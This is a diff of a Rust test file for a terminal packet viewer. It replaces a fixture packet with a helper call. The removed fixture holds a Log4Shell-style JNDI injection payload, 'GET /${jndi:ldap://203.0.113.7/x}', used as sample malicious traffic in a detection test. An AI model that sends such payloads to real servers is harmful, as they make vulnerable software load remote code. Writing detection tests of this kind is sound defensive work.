@@ -19,6 +19,9 @@ use packrat_tui::net::packet::Packet;
 use packrat_tui::tabs::{Tab, Workspace};
 use rstest::rstest;
 
+#[path = "support/critical.rs"]
+mod critical;
+
 // ─── Helpers ─────────────────────────────────────────────────────────────────
 
 fn key(code: KeyCode) -> Event {
@@ -85,23 +88,9 @@ fn tcp_payload_packet(no: u64, payload: &[u8]) -> Packet {
 }
 
 fn critical_packet() -> packrat_tui::net::packet::Packet {
-    packrat_tui::net::packet::Packet {
-        capture: None,
-        no: 77,
-        timestamp: 12.5,
-        src: "203.0.113.7".into(),
-        dst: "10.0.0.5".into(),
-        protocol: "HTTP".into(),
-        length: 128,
-        info: "exploit attempt".into(),
-        src_port: Some(44444),
-        dst_port: Some(8080),
-        vlan_id: None,
-        vlan_pcp: None,
-        vlan_dei: None,
-        outer_vlan_id: None,
-        bytes: b"GET /${jndi:ldap://203.0.113.7/x}".to_vec(),
-    }
+    let mut packet = critical::invalid_neighbor_discovery_hop_limit(77);
+    packet.timestamp = 12.5;
+    packet
 }
 
 fn live_critical_packet() -> Packet {
